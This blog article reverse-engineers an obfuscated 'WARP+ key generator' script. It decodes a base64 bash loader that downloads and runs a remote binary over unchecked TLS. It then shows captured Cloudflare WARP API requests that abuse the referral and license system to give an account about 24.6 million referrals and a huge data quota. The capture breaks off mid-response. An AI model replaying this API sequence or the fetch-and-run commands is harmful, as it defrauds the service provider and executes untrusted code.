[{"content":"Source of this article: MoeomuBlog\nAll code and related files mentioned in this article can be downloaded from this link cloudflare-warp-analyze.zip.\nTrigger While wandering around on the Internet, I found a project like this: Generate more than 20 million GB of warp+ keys in one click, you know. Whether you get it or not, the author didn\u0026rsquo;t get it anyway. Why does it generate so many keys? Maybe there\u0026rsquo;s a list and then it randomly draws one each time it runs?\nFiles Now that I\u0026rsquo;m here, it\u0026rsquo;s not right not to fork it. There are a couple of files here, the first one is replit.nix which states that the entry point for this project is wpplusreplit.sh, so let\u0026rsquo;s start with that.\n1 2 3 4 5 \u0026gt; file * README.md: UTF-8 text replit.nix: ASCII text warpplus.sh: ELF executable, 64-bit LSB x86-64, dynamic (/lib64/ld-linux-x86-64.so.2), BuildID=3dfe013b3027047470d1aac10a3504baf6969725, stripped wpplusreplit.sh: ASCII text wpplusreplit.sh The wpplusreplit.sh code is obfuscated, unsurprisingly.\nIt\u0026rsquo;s just a simple variable name obfuscation, and a bit of common sense would tell you to debug the code with bash -x, and the result is as follows:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 bash -c \u0026#39;bash -c \u0026#34;$(base64 -d \u0026lt;\u0026lt;\u0026lt; \u0026#34;\\ YmFzaCAtYyAiJChiYXNlNjQgLWQgPDw8ICJcClltRnphQ0F0WXlBaUpDaGlZWE5sTmpRZ0xXUWdQ RHc4SUNKY0NsbHRSbnBoUTBGMFdYbEJhVXBEYUdsWldFNXNUbXBSWjB4WFVXZFEKUkhjNFNVTktZ ME5zYkhSU2JuQm9VVEJHTUZkWWJFSmhWWEJFWVVkc1dsZEZOWE5VYlhCU1dqQjRXRlZYWkZFS1Vr aGpORk5WVGt0WgpNRTV6WWtoU1UySnVRbTlWVkVKSFRVWmtXV0pGU21oV1dFSkZXVlZrYzFkc1pF Wk9XRTVWWWxoQ1UxZHFRalJYUmxaWVdrWkZTMVZyCmFHcE9SazVXVkd0MFdncE5SVFY2V1d0b1Ux VXlTblZSYlRsV1ZrVktTRlJWV210WFYwcEdVMjFvVjFkRlNrWlhWbFpyWXpGa2MxcEYKV2s5WFJU VldXV3hvUTFVeFpIRlJhbEpZVW14YVdWZHJXa1pUTVZaeUNtRkhjRTlTYXpWWFZrZDBNRmRuY0U1 U1ZGWTJWMWQwYjFVeApWWGxUYmxaU1lsUnNWMVpyVmt0VFJsSldWMjEwV0ZZd2NFZFZNakZ2VmpG a1JsTnJXbGhXYkZweVdYcEdhMk14Y0VZS1YyczVXRkpVClZsZFhWM2h2VVRGVmVGcElSbEpoYkVw WlZXMTRZVmRXWkhKWGExcFVUVlphZVVOdFJraGpSVGxUWVhwV1dGWnJaREJOUm1SdVkwVTEKVTFa R1dUSldNV1F3WWpGVmVBcFdXR3hVWW14YVUxbHNVbk5XTVZweVZtdDBWRkpzU2xkV01qRXdWMFpa ZDJORlpGWk5ha1oyVm1wRwphMUpzVG5KWGJHaFhZa1p3ZVZkWWNFZGhNazE0WTBWWlMxWXljelZY UmtwVkNsWnNaRmhXTTJoMlZWUkdWbVZHY0VsU2JFcG9Za1Z3CldsWlhNVFJaVm1SWFdraEtXR0V4 Y0ZWVVZscGhaVlZPZEZKcmFHcFNWR3hVV1Zod1YxZEdXbkphUkVKT1VtMVNkVmt3VlRFS1ZURmEK UjFkVVJsZE5WMUYzVmxSR1dtVkJjRmRYUjJob1ZXeGtVMk5XVm5GUmJVWmFWbTE0ZVZkcldrdFVi RXB6VTJ4b1YwMXVhRkJXVkVaaApZMnMxV1dKSFJsTldNVW95Vm14U1FncGxSa3BYVTJ4V1UySkhV azlaYlhSTFVsWmFSMVp0Um1wTlZtdzBWMnRhY2xNeFpISldWRlpZClVtdHdNVU5zUm5SaFJtaFha V3RKTUZac1VrSmtNbFpJVTJ0c1ZHSkhhSEJaVkU1RENtVnNXblJqUlU1YVZtczFlbFl4YUhOaE1V NUgKWTBaV1ZWWnNjR2hXYlhSUFl6RktkVkpzV21sWFJrcDNWbTE0VTFZd05VZFhXR3hyVWpOQ2Mx VnFRbUZWTVd0M1draE5TMWxWVlhnSwpWMVpHY2sxV1pHaE5XRUpWVmxSS2VtVkdaRUpqUm1ScFVq RktiMVpYTUhoaU1WWkhWMjVLVjJKdFVuRlphMlEwVm14VmVXTkZPVlZpClZYQkpXbFZhWVZZeFNY cGhTRXBYWVRKU1RBcFdha1pQWTFaR2MxWnJOVmRoTTBKT1ZtMXdTbVZCY0ZOTmF6VjVWR3hhVjFW dFNrbFIKYmtKV1lsaFNNMXBXV21Ga1IxWklaRVpTVGxZeFNrcFdiVEV3WTJ4TmVHSklTbGhoZW14 WENsUlZVa05PUlU1elUyNUdWbUpIVWxoVgpiRkpXWld4YWNsVnJkRlZOVld3MVZURm9kMWxXU1hw VmJGSlZWbnBXZGtOdFVuTlhibEpxVWxoU1YxUldXa3RYUmxsNFlVYzVXbFpyCk5VY0tXVEJhVjFa V1duTlhiR2hWWWtaYVVGa3ljekZXTVdSMFpFWk9UazFWY0ZaV2JURjNWREpKZUZOdVRsaGhNbEpa V1d4U2MyTlcKVWxkYVJGSldUVmQwTTFkcll6UlRNVnB4VW0xRlN3cFdNR1JUVG14T2MxcEhhR2hO V0VKMlZqRmtkMUl4VW5SV2JFcHFVbXh3V1ZWcQpUbTlXTVdSWFZXdDBhVTFyTVRSV2JUVkxWakpL VmxkdVJsZGlWRlpFVmpCYVlWZEhWa2hrUmxaT0NtRXpRa3BYYkZaaFlURmFkRk5zClZsZGlhM0JZ VldwT1QwNUJjRmROUmxVeFZteGFZV014Y0VoaVJtaFRWbGhDUjFadGVGTlRNRFZDWTBaT1RsSkdX alpXVkVreFZERlcKZEZOclpGUUtZa2RvV0ZsWGRHRlVSbEpZWlVkR1UwMVdjREJhUlZwaFZHeGFW VlpzYkZkV2VrRjRWbTE0VG1WSFJYcGFSbWhvVFVSVwpka05zVm5SbFNHUlVWbFUxZWxscVRuZGhW a3AwVldzNVdncGlXRkpNVmtaYWExZFhUa1pUYlhoVFlYcFdTVlpyWXpGVE1rWkhVMjVLClQxZEZT bGhaVjNNeFpHdE9jMVZZYUdGU2JXaHpWVzE0ZDFReFduTlZhMlJzWWtkNGVWbFZWVFZXTVZwekNt TkZaMHRXYWtreFZERloKZVZKdVNsaGhNbWhXV1d0YVlWVkdjRVpYYkdScVlsVmFSMVF4V210VWF6 RjBZVVp3VjJFeGNISmFWM040VTBaYWMxcEdhR2xTTVVwWQpWMVpTUWsxV2JGY0tWMjVPVm1FeGNI TlphMlF3VFRGWmVVNVhjRlJOVm13elZqSjBlbE4zY0ZkTlZuQklWakZrVDFJeGNFZFViR1JPClls ZGplRlpxU2pCVk1VMTRWbGhzVm1Fd2NIRlZiWGhoWTBac2NncFdibVJYVm0xU1dGZHJhSGRVYkZw elUyNXdWMVl6YUhaWlYzaEwKVjBaV2RWRnNWbGRpVmtWM1ZtcENZV0V4WkZoVWExcFZZbGRvVDBO dFJYcFJiR2hYVWpOb1dGbDZSbUZXYXpGWENtRkhhRk5XYTNCbwpWbTB3ZUZVeFVrSmpSbkJzWVRG d1RWZFVSbUZVTWxKSFUyNU9WV0pGTlZsVmJGWjNVekZhY1ZOcVVscFdNRmw2V1RCYVYxUnNXbFZX CmJHeFhWbnBCZUZacVJtRUtWMFpPYzJKR1dVdFphMlEwVmpGc2NsZHJkRk5OV0VKWFZqSXhNRmRH V1hkT1ZXUmhVbGRTZWxsV1drdE8KYlVZMlVXeGtWMkpWTVRSV1ZtUTBWRzFXUjFac2JHaFNNRnBV Vld4V2R3cGhSVTV6VjI1U1RsWnJOVlZWYkZVeFRVWlZlV1JHWkZkUwpNSEJLVlZjMVExWjNjR2hO V0VKdlZtcEdZV0V4WkZoVWExcHJVbXhLVDFac2FFTlRWbHBZVFZSU2FrMXJXbGhWTWpWTENsZEhT bFZpClJtaGFZa1pLUjFwWGRFOWphekZXV2taa2FWSnNjRlpXYWtKcllqRmFjMVZzYUd0VFJUVlFW bTE0VjA1V2NGWlplbFpYWWtWd2VrTnQKU2tWWFZYUlhZa2RSZDFSVldtRUtZekZrY2xkck9WZGhl bFpYVm0xNFlWbFdWa2RoTTJ4T1ZsaFNWRmxzVm5kVFZsWjBaVVU1VldKVgpjRmxaVlZKVFZqQXhX RlJxVWxWV1ZuQlBXa1JCZUZOWFJraGlSbEpUVjBWS01ncFdiR04zWlVaVmVWUllaMHRaYTFwWFZs ZEtWV0pGCk9WZGlXR2d6VlRGYVUxWnNWbk5YYkZKT1ZteHdOVll5ZEZkaGJFNHpZMFprYVZKdVFs bFhWRVpoVkRKU1IxTnVUbFZpUlRWWkNsVnMKVm5kVE1WcHhVMnBTV2xZd1ZqUldWbWh2VmxkS1Jt TklSbFppV0ZJeldUQmFjMWRSY0dwU2JWSnpWbTE0ZDJWR1ZsaGxSMFpwVW10dwpWbFZ0ZUc5WGJV VjRVMjFvVjJFeVVrd0tWbXhhWVdNeFduUlNiR1JwVW01Qk1sWXlkRk5TTVZGNFdrVm9WR0V4Y0Za WmJHUnZWMFZPCmRGTnNiR2hTTUZwWVdWUktUMDB4VW5OWGF6bHFUVlZ3V2tOc2NFaGlSbEpUVjBW S1dRcFdiVEUwVm1zeFYxUnFUbXBTYkhCUFZGYzEKYjFSR1pGVlJiR1JxVFdzMVNGVnROVk5oVmtw MVVXeHNWbUpHU2xoVVYzaFdaVVphY2s5V1VtbFdWbXcyVjFSQ1lWTXhWbkpOVldocwpDbEpVUmxW V2FrbzBaVlpzVjFadVRVdFZNRnBQWkVkR1NHSXdkRlZXZWtaeVdXMTRUMWRIU2tkVWJFcFhWak5v TVZkWE5YWmtNa1pXClpFWlNWRll5VW1GWmJGWmhUbXhzVmxSclNtZ0tWbGhDUjFWV1pITlNSbkEy VFVSc1NtRlhkSEJUVldSTFlVZE5lVm95WkVwaFZrcEMKVTFka2RsQlRTWEJKYVVKcFdWaE9iMGxE U1d0UlEwbExJaWtpSUdKaGMyZ2dJaVJBSWdvPSIpIiBiYXNoICIkQCIK\u0026#34;)\u0026#34; bash \u0026#34;$@\u0026#34;\u0026#39; bash Continuing with the base64 decoding, you end up with the following code:\n1 2 3 4 5 6 7 #!/bin/bash echo echo \u0026#34;请稍等，下载更新中……\u0026#34; rm -rf warpplus.sh wget -N https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplus.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 chmod +x warpplus.sh ./warpplus.sh What? Huh? What? What? It\u0026rsquo;s just updating and launching the warpplus.sh file, right?\nCFwarp.sh The above mentions a project rwkgyg/CFwar which seems to be where the author of this script stores these scripts and updates. The CFwarp.sh found here was decrypted again using the above method to get the following code:\n1 2 3 4 5 6 7 8 9 ... if [[ $cpu = amd64 ]]; then curl -sSL -o warpplus.sh --insecure https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplus.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 elif [[ $cpu = arm64 ]]; then curl -sSL -o warpplus.sh --insecure https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplusa.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 fi chmod +x warpplus.sh timeout 60s ./warpplus.sh ... This part of the code has the same download address as shown in wpplusreplit.sh, and since the author is using an arm architecture operating system, he downloads the new warpplusa.sh, and the above code proves that it functions in the same way as warpplus.sh.\nwarpplus.sh This is an executable file under Linux, as can already be seen in Files, so this section is centered around analyzing this file.\nCheck basic information Using Detect it easy to check the details of this file unfortunately didn\u0026rsquo;t yield anything of value. The only thing I can tell is that this executable was compiled by GCC and the language is probably C/C++.\nIt is also clear that this executable contains some python code, but this entire program seems to be just a zip package that needs to be unzipped.\npydata As shown in the figure below, this huge pydata section is the object of this program to decompress, it will dump it out of the file can indeed be identified as zlib compressed file, but I did not try to decompress and analyze the contents of this huge file, which proved to be right, the reasons will be mentioned later.\nNetwork Analyse Before I analyze the network, but also use strace to trace the system API it calls, but did not get any valuable information, so these contents are omitted, but strace logging logs are provided in the attachment together.\nSince this program uses a network request to get the WARP Unlimited Traffic Key, we can guess the principle even without looking at the code and just analyzing the network request.\nAlong these lines, burpsuite was first installed. Unfortunately, this software has the required certificates built-in, and burpsuite\u0026rsquo;s certificates cannot be used to decrypt its traffic.\nDuring the run, I found that it releases the python runtime environment libraries in the /tmp folder, which total 14 M. This explains the contents of pydata above.\nAt this point, the only thing left to do for network analysis is to export the client key.\nSet the environment variable to export the SSLKEY in the current tty to the WarpPlus-TrafficCapture-Key.log file\n1 export SSLKEYLOGFILE=WarpPlus-TrafficCapture-Key.log Open wireshark with root privileges and listen on the NIC.\nrun warpPlus.sh in the current tty and wait for it to exit to stop wireshark listening\nSet TLS-(Pre)-Master-Secret log filename in wireshark to the file exported above, as shown in the question. Open http stream analysis in wireshark, dump to file, content please click here to view\nSpoilers October 10, 2023 Addendum.\nAs described in How to get free 12PB to Your Warp Key [BUG / BUFF], conforming to the following actions is fine Swipe an empty account to the recommended amount of another account.\nBackup the license you currently have on your device. Replace the license in the current device with an account that already has a very large number of referrals. Restart the WARP program. Replace the backed up license with the current device. This also explains the request process below, Cheers!\nAnalyzing the process For the sake of your brain\u0026rsquo;s health, I\u0026rsquo;m going to summarize the following directly here, where this article ends. You may not need to read the details afterward.\nClient request: POST /v0a2223/reg. Explanation: request to create an A account for Cloudflare WARP. Server response: JSON data. Explanation: The A account is currently empty. The device ID and account license representing the client are returned. Client request: POST /v0a2223/reg. Explanation: The request is to create a Cloudflare WARP account B. Server response: JSON data. Explanation: The B account is currently empty. The device ID and account license representing the client are returned. client request: PATCH /v0a2223/reg/v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739, carrying the parameter 963be82f-4a90-45a8-aaac-be558383fe44 which is the B account in step 4. representing the client\u0026rsquo;s device ID.Explanation: since 0b831bf3-224d-4d45-869b-b59edd27e739 is the device ID of account A representing the client, account A becomes the referrer of account B in this request. server-side response: comparing the data returned for the first time, remove \u0026quot;usage\u0026quot;:0 and add \u0026quot;referrer\u0026quot;: \u0026quot;963be82f-4a90-45a8-aaac-be558383fe44\u0026quot;. Client request: DELETE /v0a2223/reg/963be82f-4a90-45a8-aaac-be558383fe44. Explanation: deleting device 963be82f-4a90-45a8-aaac-be558383fe44 linked by account B. Server response: 204 No Content. Explanation: The operation was successful. Client request: PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account, carrying the parameter {\u0026quot;license\u0026quot;: \u0026quot;u7SOF218-6zQ092Od-95qVJ02k\u0026quot;}. Explanation: Changing the license of the device 0b831bf3-224d-4d45-869b-b59edd27e739 linked to account A to u7SOF218-6zQ092Od-95qVJ02k. Server response: \u0026quot;id\u0026quot;: \u0026quot;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026quot;. Explanation: new device ID granted to this device. Client request: PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account, carrying the parameter {\u0026quot;license\u0026quot;: \u0026quot;7O95xNh3-81E65Kce-W4ln892I\u0026quot;}. Explanation: change the license of device 0b831bf3-224d-4d45-869b-b59edd27e739 without WARP account link to 7O95xNh3-81E65Kce-W4ln892I. server-side response: \u0026quot;id\u0026quot;: \u0026quot;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026quot;, \u0026quot;referral_count\u0026quot;: 24598563. Explanation: there seems to be an anomaly on the Cloudflare server side where the number of referrals for the device 0b831bf3-224d-4d45-869b-b59edd27e739 linked without an account becomes 24598563. Client request: GET /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account. Explanation: Requesting device details for this no-WARP account link. Server response: \u0026quot;premium_data\u0026quot;: 24598563000000000, \u0026quot;quota\u0026quot;: 24598563000000000, \u0026quot;referral_count\u0026quot;: 24598563. Explanation: Cloudflare server seems to have an exception, an unlimited WARP traffic account was created successfully. Client request: DELETE /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739. Explanation: Remove this device with no WARP account link. Server response: 204 No Content. Explanation: The operation was successful. WarpPlus TrafficCapture HTTPStream 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 POST /v0a2223/reg HTTP/1.1 Host: api.cloudflareclient.com Content-Length: 0 Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:13 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492d808d996c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 625 Set-Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo=; path=/; expires=Mon, 09-Oct-23 07:00:13 GMT; domain=.cloudflareclient.com; HttpOnly; Secure; SameSite=None Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=%2F8Gdnjhpm99lkfYYkpf9I%2B4wMlEDZtiQuhUK1tBiAk7TwjKtvEnrjr9fBFDSEja3O4YSdnT%2FHR2JFKbsW1zm7ITkDMUZDI8kwyTLScq8fvuHdpTSXyIN9aME%2BZAVjVxWRr5gdOXuMMfCcQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;0b831bf3-224d-4d45-869b-b59edd27e739\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.823920679Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.823920679Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;usage\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;},\u0026#34;token\u0026#34;:\u0026#34;40ca084f-315e-45e2-9191-b59199c2331a\u0026#34;,\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754043Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754043Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;} POST /v0a2223/reg HTTP/1.1 Host: api.cloudflareclient.com Content-Length: 0 Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:14 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492de4daa96c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 803 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=rQULnzZb4N3TSVT6j8frTuQE01%2FJ4o58lJs4h9ROd%2F5EUN%2BhmxsjB%2BgU3%2B60wkEvCqNngwsddsIej6cIqS1nnZlTgM4mSFAvbSYwY4UurL3GOdMqNdqHCmpHkysd5UaV5l0uz3BCCNivKQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;ec26bf68-baa5-445a-b6b3-c8fb628509a2\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:13.899453227Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:13.899453227Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;usage\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;2W07lo5d-90c2f7TE-sK7Tq803\u0026#34;},\u0026#34;token\u0026#34;:\u0026#34;379fc773-f8ab-45b2-a7cd-672dbf72e748\u0026#34;,\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:13.501458226Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:13.501458226Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;} PATCH /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 52 {\u0026#34;referrer\u0026#34;: \u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:16 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492e5ebdc96c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 1608 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=ftYufwYVFe9blsUVXEH%2Bx7GGcyvLZDeToO7yhv1zKvkVerVw4By89zAfkP58xBnwWinHJLlybAoipaUM7yej7lmQhlUHLV8KzAXfORubkpvtrxizutxWESQu8m9DfE0AcTJU%2F9%2FnNt7AOw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;0b831bf3-224d-4d45-869b-b59edd27e739\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;},\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:14.909577261Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;referrer\u0026#34;:\u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;} DELETE /v0a2223/reg/963be82f-4a90-45a8-aaac-be558383fe44 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 379fc773-f8ab-45b2-a7cd-672dbf72e748 Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 204 No Content Date: Mon, 09 Oct 2023 06:30:17 GMT Connection: keep-alive Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=Cp6WP7S5U1wpURnPmkVX9o5wdGZj0DpZF6i7XdLAoVmC%2BTMjdFRuU4r1uRXpPJgD9qtRI9g2FEuV4c9vO%2F%2BPDaCb6GQ%2F0gfQBLOC2gCoLXFXYSiE3C%2Fm82%2Bcli8PCFsavtchA6D3VumK4g%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Vary: Accept-Encoding Server: cloudflare CF-RAY: 813492f20d3796c0-SJC PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 41 {\u0026#34;license\u0026#34;: \u0026#34;u7SOF218-6zQ092Od-95qVJ02k\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:21 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: 